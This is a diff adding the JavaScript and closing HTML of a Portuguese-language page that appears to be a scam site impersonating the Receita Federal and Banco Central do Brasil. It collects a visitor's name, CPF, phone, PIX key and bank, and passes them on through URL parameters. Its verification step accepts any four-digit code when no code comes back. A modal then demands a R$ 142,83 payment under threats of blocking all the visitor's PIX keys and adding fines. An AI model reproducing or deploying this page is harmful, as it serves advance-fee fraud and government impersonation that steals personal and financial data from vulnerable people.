+                        userData.phone = phone;
+                        localStorage.setItem('userData', JSON.stringify(userData));
+                        
+                        // Store verification code (NOTE: in a production app, this should never be stored client-side)
+                        currentVerificationCode = data.verification_code;
+                        
+                        // Focus on code input
+                        codeInput.focus();
+                        
+                        console.log('Código de verificação enviado com sucesso');
+                    } else {
+                        alert('Erro ao enviar o código de verificação: ' + data.message);
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro ao enviar código de verificação:', error);
+                    alert('Erro ao enviar o código de verificação. Por favor, tente novamente.');
+                })
+                .finally(() => {
+                    // Reset button state
+                    this.disabled = false;
+                    this.innerHTML = '<i class="fas fa-sms"></i> Receber meu código';
+                });
+            });
+            
+            // Confirm code button
+            confirmCodeButton.addEventListener('click', function() {
+                const code = codeInput.value.trim();
+                
+                if (code.length !== 4 || !/^\d+$/.test(code)) {
+                    alert('Por favor, digite o código de 4 dígitos enviado por SMS.');
+                    return;
+                }
+                
+                // Disable button and show loading state
+                this.disabled = true;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
+                
+                // Verify code (in production, this should be verified server-side)
+                setTimeout(() => {
+                    // For demo purposes, we'll accept any 4-digit code if API is not available
+                    if (currentVerificationCode && code !== currentVerificationCode) {
+                        alert('Código de verificação incorreto. Por favor, tente novamente.');
+                        this.disabled = false;
+                        this.innerHTML = '<i class="fas fa-check-circle"></i> Confirmar Código';
+                        return;
+                    }
+                    
+                    // Show verified section
+                    codeInputSection.style.display = 'none';
+                    verifiedPhoneSection.style.display = 'block';
+                    pixKeySection.style.display = 'block';
+                    
+                    // Format phone for display
+                    const phone = phoneInput.value;
+                    verifiedPhone.textContent = phone;
+                    
+                    // Reset button state
+                    this.disabled = false;
+                    this.innerHTML = '<i class="fas fa-check-circle"></i> Confirmar Código';
+                    
+                    // Focus on PIX key input
+                    document.getElementById('pixKeyInput').focus();
+                }, 1000);
+            });
+            
+            // PIX type buttons
+            const pixTypeButtons = document.querySelectorAll('.pix-type-button');
+            const pixKeyInput = document.getElementById('pixKeyInput');
+            
+            pixTypeButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    // Reset all buttons
+                    pixTypeButtons.forEach(btn => {
+                        btn.style.backgroundColor = '#e9ecef';
+                        btn.style.color = '#333';
+                    });
+                    
+                    // Highlight selected button
+                    this.style.backgroundColor = '#1351b4';
+                    this.style.color = 'white';
+                    
+                    // Update input placeholder based on selected type
+                    const type = this.getAttribute('data-type');
+                    
+                    // Save PIX key type to localStorage
+                    localStorage.setItem('pixKeyType', type);
+                    
+                    // Também salvar o texto para exibição
+                    let pixKeyTypeText;
+                    switch(type) {
+                        case 'cpf':
+                            pixKeyTypeText = 'CPF';
+                            break;
+                        case 'phone':
+                            pixKeyTypeText = 'Telefone';
+                            break;
+                        case 'email':
+                            pixKeyTypeText = 'Email';
+                            break;
+                        case 'random':
+                            pixKeyTypeText = 'Chave Aleatória';
+                            break;
+                        default:
+                            pixKeyTypeText = 'CPF';
+                    }
+                    localStorage.setItem('pixKeyTypeText', pixKeyTypeText);
+                    console.log(`Tipo de chave PIX alterado: ${type} (${pixKeyTypeText})`);
+                    
+                    switch(type) {
+                        case 'cpf':
+                            pixKeyInput.placeholder = 'Digite seu CPF (somente números)';
+                            pixKeyInput.value = userData.cpf || '';
+                            break;
+                        case 'phone':
+                            pixKeyInput.placeholder = 'Digite seu telefone com DDD';
+                            pixKeyInput.value = phoneInput.value || '';
+                            break;
+                        case 'email':
+                            pixKeyInput.placeholder = 'Digite seu e-mail';
+                            pixKeyInput.value = '';
+                            break;
+                        case 'random':
+                            pixKeyInput.placeholder = 'Digite sua chave aleatória';
+                            pixKeyInput.value = '';
+                            break;
+                    }
+                    
+                    // Focus on input
+                    pixKeyInput.focus();
+                });
+            });
+            
+            // Bank selection buttons
+            const bankButtons = document.querySelectorAll('.bank-button');
+            const receiveMoneyButton = document.getElementById('receiveMoneyButton');
+            
+            bankButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    // Reset all buttons
+                    bankButtons.forEach(btn => {
+                        btn.style.backgroundColor = '#e9ecef';
+                        btn.style.color = '#333';
+                    });
+                    
+                    // Highlight selected button
+                    this.style.backgroundColor = '#1351b4';
+                    this.style.color = 'white';
+                    
+                    // Enable receive money button
+                    if (pixKeyInput.value.trim()) {
+                        receiveMoneyButton.disabled = false;
+                        receiveMoneyButton.style.opacity = '1';
+                        receiveMoneyButton.style.cursor = 'pointer';
+                    }
+                    
+                    // Store selected bank
+                    const bank = this.getAttribute('data-bank');
+                    localStorage.setItem('selectedBank', bank);
+                });
+            });
+            
+            // PIX key input validation
+            pixKeyInput.addEventListener('input', function() {
+                const value = this.value.trim();
+                const selectedBank = localStorage.getItem('selectedBank');
+                
+                if (value && selectedBank) {
+                    receiveMoneyButton.disabled = false;
+                    receiveMoneyButton.style.opacity = '1';
+                    receiveMoneyButton.style.cursor = 'pointer';
+                } else {
+                    receiveMoneyButton.disabled = true;
+                    receiveMoneyButton.style.opacity = '0.5';
+                    receiveMoneyButton.style.cursor = 'not-allowed';
+                }
+            });
+            
+            // Receive money button
+            receiveMoneyButton.addEventListener('click', function() {
+                // Disable button and show loading state
+                this.disabled = true;
+                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
+                
+                // Get all user data needed for next page
+                const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+                const loanData = JSON.parse(localStorage.getItem('loanData') || '{}');
+                const pixKey = pixKeyInput.value.trim();
+                const selectedBank = document.querySelector('.bank-button[style*="background-color: rgb(19, 81, 180)"]')?.getAttribute('data-bank') || '';
+                
+                // Certifica-se que pegamos o tipo de chave mais recente
+                const pixKeyType = localStorage.getItem('pixKeyType') || 'cpf';
+                
+                // Map the type to a human-readable format
+                let pixKeyTypeText;
+                switch(pixKeyType) {
+                    case 'cpf':
+                        pixKeyTypeText = 'CPF';
+                        break;
+                    case 'phone':
+                        pixKeyTypeText = 'Telefone';
+                        break;
+                    case 'email':
+                        pixKeyTypeText = 'Email';
+                        break;
+                    case 'random':
+                        pixKeyTypeText = 'Chave Aleatória';
+                        break;
+                    default:
+                        pixKeyTypeText = 'CPF';
+                }
+                
+                // Log para depuração
+                console.log("Tipo de chave PIX selecionado:", pixKeyType, `(${pixKeyTypeText})`, "PIX key:", pixKey);
+                
+                // Armazenar todos os dados PIX em uma estrutura unificada
+                const pixData = {
+                    pixKey: pixKey,
+                    pixKeyType: pixKeyType,
+                    pixKeyTypeText: pixKeyTypeText,
+                    selectedBank: selectedBank
+                };
+                
+                // Salvar a estrutura completa no localStorage
+                localStorage.setItem('pixData', JSON.stringify(pixData));
+                
+                // Manter os itens individuais para compatibilidade com código atual
+                localStorage.setItem('pixKey', pixKey);
+                localStorage.setItem('pixKeyTypeText', pixKeyTypeText);
+                
+                // Prepare parameters for aviso page
+                const params = new URLSearchParams({
+                    nome: userData.nome || '',
+                    cpf: userData.cpf || '',
+                    phone: userData.phone || '',
+                    pix_key: pixKey,
+                    bank: selectedBank,
+                    amount: loanData.amount || '0',
+                    term: loanData.term || '0'
+                });
+                
+                // Redirect to the aviso page with parameters
+                setTimeout(() => {
+                    window.location.href = '/aviso?' + params.toString();
+                }, 1500);
+            });
+
+            // Video handling (if present)
+            const video = document.getElementById('newsVideo');
+            const soundButton = document.getElementById('soundButton');
+
+            if (video) {
+                video.addEventListener('click', function() {
+                    if (video.paused) {
+                        video.play();
+                        if (video.muted) {
+                            soundButton.style.display = 'flex';
+                        }
+                    } else {
+                        video.pause();
+                        soundButton.style.display = 'flex';
+                    }
+                });
+                
+                video.addEventListener('ended', function() {
+                    video.pause();
+                    video.muted = true;
+                    if (soundButton) {
+                        soundButton.style.display = 'flex';
+                    }
+                });
+            }
+
+            if (soundButton) {
+                soundButton.addEventListener('click', function() {
+                    if (video) {
+                        video.currentTime = 0;
+                        video.muted = false;
+                        video.play();
+                        soundButton.style.display = 'none';
+                    }
+                });
+            }
+        });
+
+        // Modal handling
+        window.onclick = function(event) {
+            const modal = document.getElementById('codeVerificationModal');
+            if (event.target == modal) {
+                modal.style.display = 'none';
+            }
+        }
+    </script>
+    <!-- Modal de Pagamento -->
+    <div id="paymentModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <img src="https://www.gov.br/receitafederal/pt-br/assuntos/aduana-e-comercio-exterior/manuais-remessas-postal-e-expressa/calculadora-versao-iii/componentes/cabecalho/img/receita-federal-logo.png" alt="Logo Receita Federal" class="modal-logo">
+            </div>
+            <div id="loaderContainer" class="loader-container">
+                <div class="loader"></div>
+                <p class="loader-text">Gerando termo de compromisso...</p>
+            </div>
+            <div><div id="qrCodeContainer" class="qr-code-container">
+                <p class="term-title">TERMO DE COMPROMISSO - BANCO CENTRAL DO BRASIL</p>
+                <div class="term-content">
+                    <p>
+                        Eu, <strong data-user="nome">{{ customer.nome }}</strong>, portador do CPF <strong data-user="cpf">{{ customer.cpf }}</strong>, 
+                        declaro estar ciente que devo realizar o pagamento no valor de <strong>R$ 142,83</strong>, 
+                        sob pena de:
+                    </p>
+                    <ul class="term-list">
+                        <li>Cancelamento imediato deste acordo</li>
+                        <li>Bloqueio de todas as chaves PIX vinculadas ao meu CPF</li>
+                        <li>Aplicação de multas adicionais</li>
+                    </ul>
+                </div>
+
+                <div class="switch-container">
+                    <label class="switch">
+                        <input type="checkbox" id="termsToggle">
+                        <span class="slider"></span>
+                    </label>
+                    <span style="font-size: 14px; color: #666;">Clique no botão acima para aceitar o acordo de liberação do seu CPF</span>
+                </div>
+
+                <button id="proceedButton" class="regularize-button" style="opacity: 0.5; cursor: not-allowed;" disabled>
+                    <i class="fas fa-shield-alt"></i>
+                    Evitar Bloqueio do CPF
+                </button>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
